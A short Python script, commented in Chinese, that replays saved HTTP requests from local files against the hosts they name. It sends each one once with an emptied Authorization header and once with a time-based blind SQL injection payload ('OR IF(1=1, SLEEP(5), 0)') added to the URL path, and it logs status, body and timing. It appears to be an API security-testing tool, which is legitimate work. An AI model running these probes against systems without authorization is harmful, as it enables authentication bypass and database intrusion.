import requests
import glob


def extract_request_details_and_send(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
        request_line = lines[0].strip()
        request_method, url_path = request_line.split(' ')[0], request_line.split(' ')[1]

        # 提取主机名
        host_line = [line for line in lines[1:] if line.startswith('Host: ')]
        host = host_line[0].split(': ')[1].strip() if host_line else ''  # 使用 strip() 清理
        base_url = "http://" + host + url_path

        headers = {}
        for line in lines[1:]:
            line = line.strip()
            if not line:
                break
            key, value = line.split(': ', 1)
            headers[key] = value

        # 测试 Authorization 头部为空的场景
        headers_copy = headers.copy()
        if 'Authorization' in headers_copy:
            headers_copy['Authorization'] = ''
        send_request(request_method, base_url, headers_copy)

        # 测试时间盲注的场景
        blind_injection_url = base_url.rsplit('/', 1)[0] + f'/"{base_url.rsplit("/", 1)[1]} OR IF(1=1, SLEEP(5), 0)"'
        send_request(request_method, blind_injection_url, headers)


def send_request(request_method, url, headers):
    response = requests.request(request_method, url, headers=headers)
    print(f"请求响应状态码: {response.status_code}")
    print(f"请求响应内容: {response.text}")
    print(f"请求响应耗时: {response.elapsed.total_seconds()} 秒")
    print("=" * 40)  # 分隔线


# 获取当前目录下所有 .txt 文件
file_paths = glob.glob('./apitext_delete/*.txt')
for file_path in file_paths:
    extract_request_details_and_send(file_path)
